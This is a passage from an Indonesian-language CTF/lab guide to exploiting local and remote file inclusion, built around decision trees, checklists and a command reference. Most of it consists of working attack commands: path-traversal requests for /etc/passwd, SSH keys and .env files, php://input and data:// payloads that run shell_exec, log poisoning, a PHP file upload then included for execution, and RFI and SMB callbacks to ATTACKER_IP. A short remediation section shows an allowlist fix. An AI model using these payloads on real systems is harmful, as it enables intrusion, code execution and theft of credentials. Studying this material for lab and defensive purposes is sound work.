def read_file():
    filename = request.args.get('file')
    with open(filename, 'r') as f:  # ❌ Vulnerable!
        return f.read()
```

**Path traversal:**
```bash
curl -sG 'http://10.10.10.10/read' \
  --data-urlencode 'file=../../../../etc/passwd'
```

**Tidak ada PHP wrappers** seperti `php://filter`, tapi **path traversal tetap applicable**.

#### 2. Node.js

```javascript
// Vulnerable code
app.get('/file', (req, res) => {
    const file = req.query.path;
    res.sendFile(file);  // ❌ Vulnerable jika tidak di-validate!
});
```

**Path traversal:**
```bash
curl -sG 'http://10.10.10.10/file' \
  --data-urlencode 'path=../../../../etc/passwd'
```

**Node.js specific issues:**
- `path.join()` vulnerability jika tidak sanitize input
- `fs.readFile()` bisa baca arbitrary files

#### 3. Ruby (Rails/Sinatra)

```ruby
# Vulnerable code
get '/view' do
  filename = params[:file]
  File.read(filename)  # ❌ Vulnerable!
end
```

**Path traversal:**
```bash
curl -sG 'http://10.10.10.10/view' \
  --data-urlencode 'file=../../../../etc/passwd'
```

#### 4. Java (Spring/Servlets)

```java
// Vulnerable code
@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
    Path path = Paths.get(filename);  // ❌ Vulnerable!
    Resource resource = new FileSystemResource(path);
    return ResponseEntity.ok().body(resource);
}
```

**Path traversal:**
```bash
curl -sG 'http://10.10.10.10/download' \
  --data-urlencode 'filename=../../../../etc/passwd'
```

---

### Perbedaan Utama vs PHP LFI

|Aspect|PHP|Non-PHP (Python/Node/Ruby/Java)|
|---|---|---|
|**Path Traversal**|✅ Applicable|✅ Applicable (SAMA)|
|**Wrappers**|✅ `php://filter`, `php://input`, `data://`|❌ Tidak ada|
|**Log Poisoning**|✅ Applicable|✅ Applicable (SAMA)|
|**File Upload + LFI**|✅ Applicable|✅ Applicable (SAMA)|
|**Direct Code Exec**|✅ Via `include()`/`require()`|❌ File read saja (kecuali template injection)|
|**Common in CTF**|✅✅✅ Sangat sering|⚠️ Lebih jarang|

---

### Key Takeaway

```text
PHP Wrappers (php://filter, php://input, data://) 
→ HANYA BERLAKU DI PHP

Path Traversal (../../../etc/passwd)
→ BERLAKU DI SEMUA BAHASA

Log Poisoning
→ BERLAKU DI SEMUA BAHASA (tergantung web server)

Upload + LFI
→ BERLAKU DI SEMUA BAHASA
```

### Strategi Non-PHP LFI

Jika menemukan LFI di **non-PHP application:**

1. ✅ **Path traversal** — coba dulu `../../../../etc/passwd`
2. ✅ **Sensitive files** — coba `/etc/passwd`, `/home/user/.ssh/id_rsa`, application config
3. ✅ **Log poisoning** — jika ada akses ke log files
4. ✅ **Upload + LFI combo** — jika ada upload functionality
5. ❌ **Skip PHP wrappers** — tidak akan work

### Contoh HTB Box Non-PHP LFI

- **Beep** — Elastix (PHP) tapi sebagian vulnerability di binary
- **Poison** — FreeBSD + custom app (path traversal applicable)
- **Undetected** — Java application (path traversal via parameter)

**Bottom line:** Jangan asumsikan LFI = PHP. **Path traversal principles berlaku universal.**

---

# Bagian 9 — Decision Tree Lengkap

### 📌 Kapan Digunakan

Gunakan decision tree ini sebagai **master flow** ketika menjalankan box/lab dari awal sampai escalation.

```text
                    PARAMETER DITEMUKAN
                 file= / page= / path= / view=
                            |
                            v
                  +----------------------+
                  | Baseline request     |
                  | page=home            |
                  +----------+-----------+
                             |
                             v
                TEST ../../../../etc/passwd
                             |
                +------------+------------+
                |                         |
                v                         v
          SUCCESS                     FAIL
                |                         |
                v                         v
     LINUX LFI CONFIRMED           Test Windows marker
                |                         |
        +-------+-------+                 |
        |       |       |                 v
        v       v       v          ../../../../windows/win.ini
     filter   logs   proc/env              |
        |       |       |            +-----+-----+
        |       |       |            |           |
        |       |       |            v           v
        |       |       |         SUCCESS       FAIL
        |       |       |            |           |
        |       |       |            v           v
        |       |       |       WINDOWS LFI   More testing
        |       |       |         
        |       |       |
        |       |       +--> /proc/self/environ
        |       |
        |       +----------> Apache/Nginx logs
        |
        +------------------> php://filter
                                 |
                                 v
                           Source disclosure
                                 |
                                 v
                        Find config / secrets /
                        hidden include paths
                                 |
                                 v
                           php://input?
                                 |
                         +-------+-------+
                         |               |
                        YES              NO
                         |               |
                         v               v
                        RCE         data:// ?
                                         |
                                  +------+------+
                                  |             |
                                 YES            NO
                                  |             |
                                  v             v
                                 RCE        Upload available?
                                                   |
                                             +-----+-----+
                                             |           |
                                            YES          NO
                                             |           |
                                             v           v
                                     Upload PHP file   Logs readable?
                                             |               |
                                             v          +----+----+
                                       Predict path    |         |
                                             |         YES        NO
                                             v          |         |
                                          LFI include   v         v
                                             |       Poison    /proc?
                                             v        log        |
                                            RCE         |        |
                                                       v        v
                                                      RCE     Inspect


IF BASIC LFI FAILS:

../../../../etc/passwd
        |
        v
%2e%2e%2f...
        |
        v
%252e%252e%252f...
        |
        v
....//....
        |
        v
..././...
        |
        v
absolute:
/etc/passwd
        |
        v
Windows:
..\..\..\Windows\win.ini
        |
        v
check application normalization
```

---

## RFI Branch

```text
PARAMETER
   |
   v
Basic LFI
   |
   v
Can application include remote URL?
   |
   +----------+
   |          |
  YES         NO
   |          |
   v          v
RFI        LFI only
   |
   v
http://ATTACKER/test.txt
   |
   +-----------+-----------+
   |                       |
   v                       v
GET from attacker       No GET
   |                       |
   v                       v
RFI possible          Network/config/
   |                  URL restrictions
   v
test PHP
   |
   v
PHP executes?
   |
 +---+---+
 |       |
YES      NO
 |       |
 v       v
RCE    Remote read
```

---

# Bagian 10 — Common Errors & Troubleshooting

|#|Error / Kondisi|Sebab|Solusi|
|--:|---|---|---|
|1|`File not found`|Path salah|Tambahkan traversal depth|
|2|`No such file or directory`|Target path tidak ada|Uji `/etc/passwd`, `/etc/hosts`, `/etc/hostname`|
|3|`Permission denied`|Web process tidak punya permission|Pilih file readable|
|4|`include(): Failed opening required`|Include gagal|Baca exact path dari error|
|5|`../` diblokir|WAF/filter|Uji encoding pada lab|
|6|`%2e%2e%2f` gagal|Server decode sebelum/atau sesudah filter secara berbeda|Uji raw vs encoded dan amati normalization|
|7|Double encoding gagal|Hanya ada satu decode stage|Jangan asumsi dua-stage decoder|
|8|`....//` gagal|Filter melakukan canonicalization|Uji absolute path atau alternative syntax|
|9|Absolute path gagal|Aplikasi menambahkan prefix|Trace resulting path melalui error|
|10|Prefix application tidak bisa dihindari|Input selalu digabung dengan fixed directory|Cari traversal dari lokasi tersebut|
|11|Null byte tidak bekerja|PHP modern|Jangan gunakan untuk modern PHP|
|12|`php://filter` gagal|Wrapper/filter blocked|Coba exact syntax dan file target berbeda|
|13|Base64 output kosong|Resource path salah|Confirm file path|
|14|Base64 decode error|Response mengandung HTML/noise|Extract base64 payload dahulu|
|15|`php://input` gagal|Include/configuration tidak cocok|Coba `php://filter` atau upload+LFI|
|16|`data://` gagal|Remote include/wrapper restrictions|Check configuration|
|17|`expect://` gagal|Extension tidak terpasang|Skip dan lanjut ke primitive lain|
|18|Log file tidak readable|Permissions|Test log lain atau `/proc`|
|19|Apache log kosong|Logging path berbeda|Cek server/framework config|
|20|Nginx log kosong|Custom log location|Cari config|
|21|Log poison marker tidak muncul|Header tidak masuk log|Inspect log format|
|22|Marker ada tetapi tidak execute|Include result treated as data / PHP parsing context berbeda|Confirm include semantics|
|23|Upload berhasil tetapi LFI gagal|Path salah|Cari upload response/storage path|
|24|ZIP upload berhasil tetapi `zip://` gagal|Wrapper/archive path salah|Confirm absolute archive path|
|25|RFI gagal|`allow_url_include` off|Check config/source/phpinfo|
|26|RFI server tidak reachable|Routing/firewall/incorrect IP|Verify attacker listener and target network path|
|27|Target melakukan request tetapi PHP tidak execute|Remote content fetched as data or inclusion restriction|Test harmless text first, then PHP behavior|
|28|SMB share tidak pernah menerima connection|Target bukan Windows/UNC unsupported|Gunakan HTTP path atau stop SMB branch|
|29|`/proc/self/environ` tidak menunjukkan header|Header tidak menjadi environment variable|Jangan anggap header = env|
|30|LFI works, RCE doesn't|LFI ≠ code execution|Coba wrapper/source disclosure/upload/log route|
|31|`id` menghasilkan `0`|Return code bukan stdout|Gunakan output-returning primitive|
|32|Response length sama untuk semua payload|App normalizes/rejects input|Bandingkan status, marker, error, timing|
|33|Browser bekerja, curl gagal|Request mismatch|Copy exact raw request dari Burp|
|34|curl bekerja, Burp gagal|Encoding mutation|Compare raw query/body|
|35|`php://filter` hanya menghasilkan base64 noise|Tidak seluruh body adalah encoded source|Isolate encoded region|
|36|Source code tidak berisi password|Credentials ada di `.env`/secret file lain|Cari configuration chain|
|37|`/etc/shadow` tidak terbaca|Permission|Jangan menganggap LFI = root|
|38|`id_rsa` tidak ditemukan|Home directory salah|Gunakan `/etc/passwd` terlebih dahulu|
|39|`auth.log` tidak ada|journald/custom logging|Periksa log configuration|
|40|RFI request keluar tetapi timeout|Egress filtering|Gunakan reachable lab interface/IP|

---

# Troubleshooting Flow

```text
LFI GAGAL
   |
   v
Apakah parameter benar?
   |
  YES
   |
   v
Apakah input sampai server?
   |
  YES
   |
   v
Apakah path benar?
   |
   +---- NO → adjust depth/path
   |
   +---- YES
           |
           v
     Try /etc/passwd
           |
           +---- SUCCESS → LFI CONFIRMED
           |
           +---- FAIL
                  |
                  v
             Encoding
                  |
                  v
             Normalization
                  |
                  v
             Absolute path
                  |
                  v
             Windows path
                  |
                  v
             Re-evaluate
             attack surface
```

---

# LFI Escalation Priority

### 📌 Kapan Digunakan

Gunakan prioritas ini agar tidak membuang waktu melakukan teknik rumit sebelum teknik sederhana.

```text
P0
│
├── /etc/passwd
├── /etc/hosts
├── /etc/hostname
├── application config
└── php://filter
      |
      v
P1
│
├── .env
├── config.php
├── /proc/self/environ
├── /proc/self/cmdline
├── SSH keys
└── logs
      |
      v
P2
│
├── php://input
├── data://
├── upload + LFI
└── log poisoning
      |
      v
P3
│
├── expect://
├── phar://
├── SMB/UNC
└── complex parser chains
```

---

# Muscle Memory — LFI 60 Seconds

Saat menemukan:

```text
file=
page=
include=
path=
template=
view=
lang=
```

jalankan:

```text
1. Baseline
2. ../../../../etc/passwd
3. ../../../etc/passwd
4. /etc/passwd
5. %2e%2e%2f...
6. /etc/hosts
7. /etc/hostname
```

Jika confirmed:

```text
8. php://filter
9. application config
10. /proc/self/environ
11. logs
12. upload path
```

Jika PHP:

```text
13. php://input
14. data://
15. zip://
```

Jika perlu escalation:

```text
16. upload + LFI
17. log poisoning
18. wrapper-based RCE
```

Jika RFI terlihat mungkin:

```text
19. test remote text file
20. verify callback
21. test remote PHP on lab
```

---

# Jinja-like Thinking untuk LFI

Seperti SSTI, jangan menghafal satu payload.

Jangan berpikir:

```text
LFI
→ /etc/passwd
→ selesai
```

Gunakan:

```text
LFI
 |
 +-- What filesystem?
 |
 +-- What application?
 |
 +-- What process user?
 |
 +-- What file can I read?
 |
 +-- Can I read source?
 |
 +-- Can I influence a file?
 |
 +-- Can the interpreter execute included content?
 |
 +-- Is there an upload?
 |
 +-- Is there a writable/readable log?
 |
 +-- Are wrappers available?
```

---

# Source Disclosure → New Attack Surface

Salah satu workflow paling powerful:

```text
LFI
 ↓
php://filter
 ↓
index.php
 ↓
config.php
 ↓
.env
 ↓
DB credentials
 ↓
database access
 ↓
application data
```

Atau:

```text
LFI
 ↓
source code
 ↓
hidden upload directory
 ↓
upload
 ↓
LFI uploaded PHP
 ↓
RCE
```

Atau:

```text
LFI
 ↓
source code
 ↓
log path discovered
 ↓
log poison
 ↓
RCE
```

---

# Master LFI Decision Framework

```text
                    LFI
                     |
             "What can I read?"
                     |
        +------------+------------+
        |            |            |
        v            v            v
      OS files    Source code   Runtime info
        |            |            |
        v            v            v
   users/hosts     config      /proc/*
        |            |            |
        +------------+------------+
                     |
                     v
            "Can I influence
              any file?"
                     |
          +----------+----------+
          |                     |
         YES                    NO
          |                     |
          v                     v
       uploads                wrappers
       logs                   source
       env                    secrets
          |                     |
          +----------+----------+
                     |
                     v
                "Can PHP
                interpret it?"
                     |
              +------+------+
              |             |
             YES            NO
              |             |
              v             v
             RCE       information
                         disclosure
```

---

# Master Checklist

## Discovery

```text
[ ] Endpoint identified
[ ] Parameter identified
[ ] Parameter controls file/path
[ ] Baseline response captured
```

## Basic LFI

```text
[ ] ../../../etc/passwd
[ ] ../../../../etc/passwd
[ ] /etc/passwd
[ ] /etc/hosts
[ ] /etc/hostname
```

## Windows

```text
[ ] ../../../../windows/win.ini
[ ] hosts file
[ ] web.config
[ ] XAMPP config
```

## Traversal Bypass

```text
[ ] URL encoding
[ ] Double encoding
[ ] ..// pattern
[ ] ....// pattern
[ ] mixed slash
[ ] absolute path
[ ] normalization behavior
[ ] legacy null-byte only when relevant
```

## Sensitive Files

```text
[ ] /etc/passwd
[ ] /etc/hosts
[ ] /etc/hostname
[ ] /proc/self/environ
[ ] /proc/self/cmdline
[ ] /proc/net/tcp
[ ] .env
[ ] config.php
[ ] SSH keys
[ ] web server config
[ ] application config
```

## PHP

```text
[ ] php://filter
[ ] php://input
[ ] data://
[ ] expect://
[ ] zip://
[ ] phar://
```

## RCE Paths

```text
[ ] Upload + LFI
[ ] Apache log
[ ] Nginx log
[ ] auth.log
[ ] mail log
[ ] /proc/self/environ
```

## RFI

```text
[ ] allow_url_include checked
[ ] Remote text callback tested
[ ] Target can reach attacker
[ ] Remote PHP tested in lab
[ ] SMB/UNC considered only for Windows
```

## Documentation

```text
[ ] Vulnerable parameter
[ ] Exact request
[ ] Exact payload
[ ] Response
[ ] Root cause
[ ] Engine/version
[ ] Impact
[ ] RCE path, if applicable
[ ] Evidence
[ ] Remediation
```

---

# Quick Command Reference

## Basic LFI

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd'
```

---

## Absolute Path

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/etc/passwd'
```

---

## Encoded Traversal

```bash
curl \
  'http://10.10.10.10/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
```

---

## Double Encoding

```bash
curl \
  'http://10.10.10.10/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
```

---

## `/proc/self/environ`

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/proc/self/environ'
```

---

## PHP Filter

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php'
```

---

## PHP Filter + Decode

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' \
  | base64 -d
```

---

## PHP Input

```bash
curl -s \
  -X POST \
  'http://10.10.10.10/index.php?page=php://input' \
  --data '<?php echo "LFI_INPUT_OK"; ?>'
```

---

## PHP Input RCE — Lab

```bash
curl -s \
  -X POST \
  'http://10.10.10.10/index.php?page=php://input' \
  --data "<?php echo shell_exec('id'); ?>"
```

---

## Data Wrapper — Lab

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode "page=data://text/plain,<?php echo 'DATA_OK'; ?>"
```

---

## Apache Log Poison

Inject safe marker:

```bash
curl -s \
  -A '<?php echo "LOG_POISON_OK"; ?>' \
  'http://10.10.10.10/'
```

Read log:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/apache2/access.log'
```

---

## Nginx Log

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/nginx/access.log'
```

---

## Upload + LFI

Create:

```bash
cat > shell.php <<'PHP'
<?php echo "UPLOAD_LFI_OK"; ?>
PHP
```

Upload:

```bash
curl -s \
  -F 'file=@shell.php' \
  'http://10.10.10.10/upload'
```

Include:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/www/html/uploads/shell.php'
```

---

## RFI Text Test

Attacker:

```bash
python3 -m http.server 8000 --bind 0.0.0.0
```

Target:

```bash
curl -sG \
  'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/test.txt'
```

---

## SMB Lab

Attacker:

```bash
impacket-smbserver share ~/smb-share -smb2support
```

Target path:

```text
\\ATTACKER_IP\share\test.php
```

---

# Root Cause — What Should Be Fixed?

## Jangan

```php
include($_GET['page']);
```

## Gunakan Allowlist

```php
$pages = [
    'home' => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
];

$page = $_GET['page'] ?? 'home';

if (!array_key_exists($page, $pages)) {
    http_response_code(404);
    exit;
}

include($pages[$page]);
```

---

## Defense Principles

```text
1. Jangan gunakan arbitrary user-controlled include path.
2. Gunakan allowlist.
3. Canonicalize path sebelum security decision.
4. Batasi file ke directory yang memang diperlukan.
5. Hindari dynamic include bila tidak diperlukan.
6. Jangan aktifkan remote include tanpa kebutuhan.
7. Gunakan least privilege.
8. Jangan menyimpan secrets di source jika dapat dihindari.
9. Jangan expose verbose PHP errors di production.
10. Audit upload + file inclusion sebagai satu attack surface.
```

---

# Golden Rules

```text
RULE 1
LFI ≠ RCE
```

```text
RULE 2
/etc/passwd adalah proof awal, bukan tujuan akhir.
```

```text
RULE 3
php://filter sering lebih berguna daripada
langsung mengejar RCE.
```

```text
RULE 4
Source code → configuration → secrets → new attack surface.
```

```text
RULE 5
Blacklist traversal ≠ secure file handling.
```

```text
RULE 6
Null-byte bypass adalah teknik legacy,
bukan universal PHP trick.
```

```text
RULE 7
RFI membutuhkan remote-fetch/include behavior;
LFI tidak otomatis berarti RFI.
```

```text
RULE 8
Log poisoning membutuhkan dua hal:
attacker-controlled log content
+
LFI/include yang dapat memprosesnya.
```

```text
RULE 9
Windows UNC/SMB bukan pengganti umum untuk HTTP RFI.
Gunakan hanya ketika target semantics mendukungnya.
```

```text
RULE 10
Selalu validasi RCE dengan primitive sederhana:
id
whoami
pwd
hostname
```

---

# Final Mental Model

```text
                     LFI
                      |
                      v
              +---------------+
              | READ A FILE?   |
              +-------+-------+
                      |
                      v
                Identify OS
                 /       \
              Linux     Windows
                |           |
                v           v
          Sensitive files  win.ini/
                |           web.config
                v
          Identify PHP?
                |
          +-----+-----+
          |           |
         YES          NO
          |           |
          v           v
    php://filter    generic
          |
          v
      SOURCE CODE
          |
          v
     Find secrets /
     paths / uploads
          |
          v
       RCE PATH
          |
      +---+---+---+
      |       |   |
      v       v   v
   wrapper  upload logs
      |       |   |
      +-------+---+
              |
              v
             RCE

RFI:
LFI + remote include capability
           |
           v
   http://ATTACKER/test.txt
           |
           v
      remote callback
           |
           v
     remote PHP test
           |
           v
            RCE
```

---

# One-Page CTF Flow

```text
┌──────────────────────────────────────────────┐
│              DISCOVER PARAMETER              │
│ file / page / include / path / view / lang  │
└──────────────────────┬───────────────────────┘
                       |
                       v
┌──────────────────────────────────────────────┐
│               BASIC TRAVERSAL                │
│ ../../../../etc/passwd                       │
└──────────────────────┬───────────────────────┘
                       |
                       v
              +--------+--------+
              |                 |
             FAIL              SUCCESS
              |                 |
              v                 v
         ENCODING          LFI CONFIRMED
         NORMALIZE               |
         ABS PATH                |
         WINDOWS                 v
              |          /etc/passwd
              |          /etc/hosts
              |          /proc/*
              |          config/.env
              |                 |
              |                 v
              |          PHP APPLICATION?
              |                 |
              |            +----+----+
              |            |         |
              |           YES        NO
              |            |         |
              |            v         v
              |      php://filter   continue
              |            |
              |            v
              |       SOURCE CODE
              |            |
              |            v
              |        FIND PATHS
              |        SECRETS
              |        UPLOAD
              |        LOGS
              |            |
              |            v
              |        ESCALATION
              |            |
              |     +------+------+
              |     |             |
              |   wrapper       upload/log
              |     |             |
              |     +------+------+
              |            |
              |            v
              |           RCE
              |
              v
            RETEST
```

---

# Final Verification Checklist

```text
[ ] Saya membedakan Path Traversal, LFI, dan RFI.
[ ] Saya bisa mengidentifikasi parameter LFI.
[ ] Saya bisa melakukan traversal manual.
[ ] Saya tahu kapan menggunakan absolute path.
[ ] Saya memahami URL encoding vs double encoding.
[ ] Saya tahu null byte adalah legacy technique.
[ ] Saya bisa membaca /etc/passwd.
[ ] Saya tahu target Linux dan Windows yang umum.
[ ] Saya bisa membaca source PHP dengan php://filter.
[ ] Saya paham php://input.
[ ] Saya paham data://.
[ ] Saya tahu expect:// jarang tersedia.
[ ] Saya paham upload + LFI.
[ ] Saya paham log poisoning.
[ ] Saya tahu /proc/self/environ bukan otomatis injectable.
[ ] Saya memahami LFI tidak otomatis berarti RCE.
[ ] Saya tahu RFI membutuhkan remote inclusion behavior.
[ ] Saya bisa membuat HTTP server di Parrot.
[ ] Saya tahu kapan SMB/UNC relevan.
[ ] Saya bisa menggunakan ffuf.
[ ] Saya bisa menggunakan curl untuk manual verification.
[ ] Saya bisa menggunakan script lfi_detect.sh.
[ ] Saya bisa mengikuti decision tree tanpa Google.
```

---

# Final Muscle Memory

```text
FIND
 ↓
PARAMETER
 ↓
../../../../etc/passwd
 ↓
CONFIRM LFI
 ↓
/etc/hosts
/etc/hostname
/proc/self/environ
 ↓
PHP?
 ↓
php://filter
 ↓
SOURCE
 ↓
CONFIG / .env / UPLOAD / LOG
 ↓
CHOOSE ESCALATION
 ├── php://input
 ├── data://
 ├── upload + LFI
 ├── log poisoning
 └── other lab-specific primitive
 ↓
VALIDATE
 ├── id
 ├── whoami
 ├── pwd
 └── hostname
 ↓
DOCUMENT
```

> **Inti workflow 24:** jangan menghafal `../../../../etc/passwd` sebagai tujuan. Hafalkan proses berpikir:
> 
> **“Parameter apa yang mengontrol file → file apa yang bisa dibaca → OS/framework apa → apakah PHP memproses inclusion → apakah source dapat dibocorkan → apakah ada wrapper/upload/log yang dapat menjadi execution primitive.”**

---



---

---

# 🗺️ LFI/RFI Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
>
> **LFI ≠ RCE otomatis.** Setiap jalur menuju RCE bergantung pada: PHP version, wrapper availability, file permissions, upload functionality, log access, dan konfigurasi server.

---

## 🔧 PRE-FLIGHT: Setup Environment

```bash
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.100"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export WEBPORT="8080"            # Port HTTP server kamu untuk RFI
mkdir -p ~/lfi_loot/{source,creds,logs,payloads}
cd ~/lfi_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"
```

**Output yang diharapkan:**
```
[*] Target: 10.10.11.100 | LHOST: 10.10.14.5:4444
```

---

## ═══════════════════════════════════════
## FASE 0: RECON — FINGERPRINT WEB SERVER
## ═══════════════════════════════════════

### Langkah 0.1 — Deteksi OS & Web Server

```bash
# Command 1: Ping test → TTL untuk OS detection
ping -c 3 $TARGET

# Command 2: HTTP banner grab
curl -sI "http://$TARGET/" | head -20

# Command 3: Nmap service scan port web
nmap -sV -p 80,443,8080,8443 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows/IIS):**
```
64 bytes from 10.10.11.100: icmp_seq=1 ttl=127 time=32.1 ms
```
➡️ Target Windows → Fokus LFI ke Windows files (`win.ini`, `hosts`, `SAM`)  
➡️ Catat: **`export OS="windows"`**

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux/Apache/Nginx):**
```
64 bytes from 10.10.11.100: icmp_seq=1 ttl=63 time=18.4 ms
```
➡️ Target Linux → Fokus ke `/etc/passwd`, `/proc/self/environ`, log poisoning  
➡️ Catat: **`export OS="linux"`**

**OUTPUT BERHASIL ✅ — HTTP Banner:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
X-Powered-By: PHP/7.4.3
```

**Cara baca banner — PENTING:**

| Field | Contoh | Arti & Tindakan |
|---|---|---|
| `Server: Apache/2.4.49` | Apache versi | **Cek CVE Apache 2.4.49 — Path Traversal (CVE-2021-41773)!** |
| `Server: nginx/1.18.0` | Nginx | Log di `/var/log/nginx/access.log` |
| `X-Powered-By: PHP/7.4.3` | PHP version | PHP 7.4 → wrapper `php://input` mungkin bekerja |
| `X-Powered-By: PHP/5.3.x` | PHP lama | Null byte `%00` bypass mungkin aktif |
| `Server: Microsoft-IIS/10.0` | IIS | Target Windows, fokus ke `../../windows/win.ini` |
| Tidak ada banner | Security hardening | Butuh fingerprint lebih dalam |

**OUTPUT GAGAL ❌ — Connection refused / timeout:**
```
curl: (7) Failed to connect to 10.10.11.100 port 80
```
➡️ Coba port lain:
```bash
# Scan semua port web umum
nmap -p 80,443,8000,8080,8443,3000,5000,8888 $TARGET --open
```

---

### Langkah 0.2 — Framework & CMS Detection

```bash
# Command 1: Whatweb (comprehensive fingerprint)
whatweb -a 3 "http://$TARGET/"

# Command 2: Wappalyzer equivalent — curl + grep
curl -sL "http://$TARGET/" | grep -iE "(wordpress|joomla|drupal|laravel|django|flask|codeigniter)"

# Command 3: Cek file-file khas framework
curl -si "http://$TARGET/wp-login.php"           # WordPress?
curl -si "http://$TARGET/administrator/"          # Joomla?
curl -si "http://$TARGET/.env"                   # Laravel/Django?
curl -si "http://$TARGET/info.php"               # PHP info exposed?
```

**OUTPUT BERHASIL ✅ — Whatweb detect framework:**
```
http://10.10.11.100/ [200 OK] Apache[2.4.49], PHP[7.4.3], 
WordPress[5.8], ...
```
➡️ WordPress terdeteksi → LFI target utama: `wp-config.php` dan `/etc/passwd`  
➡️ Lanjut ke **[🛡️ 17a. WordPress Advanced Exploitation & Workflow Guide](/docs/wordpress)** SETELAH konfirmasi LFI

**OUTPUT BERHASIL ✅ — PHP info terbuka:**
```
PHP Version 7.4.3
allow_url_include => On => On     ← KRITIS! RFI & php://input aktif
allow_url_fopen => On => On
```

**Cara baca phpinfo untuk LFI/RFI:**

| Setting | Value | Artinya |
|---|---|---|
| `allow_url_include` | On | **RFI aktif + php://input + data:// wrapper bisa jalan** |
| `allow_url_include` | Off | RFI tidak jalan, fokus ke LFI + filter chain |
| `disable_functions` | Daftar panjang | `system()` mungkin diblock → pakai `passthru()`, `shell_exec()` |
| `open_basedir` | `/var/www/html` | LFI dibatasi direktori ini, traversal ke `/etc` mungkin gagal |
| `session.save_path` | `/var/lib/php/sessions` | Potential session poisoning path |

---

## ═══════════════════════════════════════
## FASE 1: PARAMETER DISCOVERY
## ═══════════════════════════════════════

> **Tujuan:** Temukan parameter yang mengontrol file/path sebelum mencoba exploit apapun.

### Langkah 1.1 — Manual Parameter Hunting

```bash
# Lihat source HTML — cari parameter file/page/path/include
curl -sL "http://$TARGET/" | grep -iE "(file=|page=|path=|include=|template=|view=|lang=|dir=|doc=|load=)"

# Coba halaman utama dengan berbagai parameter
curl -sL "http://$TARGET/index.php?page=home"
curl -sL "http://$TARGET/index.php?file=home"
curl -sL "http://$TARGET/?view=home"

# Cari di robots.txt dan sitemap
curl -sL "http://$TARGET/robots.txt"
curl -sL "http://$TARGET/sitemap.xml"
```

**OUTPUT BERHASIL ✅ — Parameter file ditemukan di source:**
```html
<a href="?page=contact">Contact</a>
<a href="?page=about">About</a>
```
➡️ Parameter `page=` teridentifikasi. Lanjut ke **Langkah 1.2**

**OUTPUT GAGAL ❌ — Tidak ada parameter obvious:**
```
(HTML normal tanpa parameter file)
```
➡️ Jalankan fuzzer parameter:
```bash
# ffuf untuk parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://$TARGET/index.php?FUZZ=test" \
     -fs 0 -mc 200 -t 50

# Atau arjun (tool khusus parameter discovery)
arjun -u "http://$TARGET/index.php"
```

---

### Langkah 1.2 — Fuzzing Endpoint dengan LFI Wordlist

```bash
# Fuzz parameter page= dengan payload traversal
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "http://$TARGET/index.php?page=FUZZ" \
     -fs 0,1234 -t 50 \
     -o ~/lfi_loot/ffuf_lfi.txt

# Alternatif: dengan payload khusus Linux
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-common-files.txt \
     -u "http://$TARGET/index.php?page=FUZZ" \
     -mc 200 -fw 100
```

**OUTPUT BERHASIL ✅ — ffuf menemukan hit:**
```
/etc/passwd             [Status: 200, Size: 1823, Words: 45]
../../../../etc/passwd  [Status: 200, Size: 1823, Words: 45]
```
➡️ LFI confirmed! Lanjut ke **FASE 2**

**OUTPUT GAGAL ❌ — Semua 200 tapi size sama (false positive):**
```
(semua response size identik = page tidak berubah)
```
➡️ Filter dengan size yang berbeda dari baseline:
```bash
# Ambil baseline size dulu
BASELINE=$(curl -s "http://$TARGET/index.php?page=nonexistent123" | wc -c)
echo "Baseline size: $BASELINE"

# Fuzz dengan filter size yang tepat
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "http://$TARGET/index.php?page=FUZZ" \
     -fs $BASELINE -t 50
```

---

## ═══════════════════════════════════════
## FASE 2: KONFIRMASI LFI
## ═══════════════════════════════════════

> **Tujuan:** Pastikan LFI benar-benar ada, bukan false positive. Gunakan file yang pasti ada di semua sistem.

### Langkah 2.1 — Basic LFI Test (Linux)

```bash
# Test 1: Direct absolute path (paling sederhana)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=/etc/passwd"

# Test 2: Traversal depth 3 (web root biasanya 3 level dari root)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../etc/passwd"

# Test 3: Traversal depth 4 (jika ada subfolder)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../etc/passwd"

# Test 4: Traversal depth 5-6 (deep application structure)
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../../etc/passwd"
curl -sG "http://$TARGET/index.php" \
     --data-urlencode "page=../../../../../../etc/passwd"
```

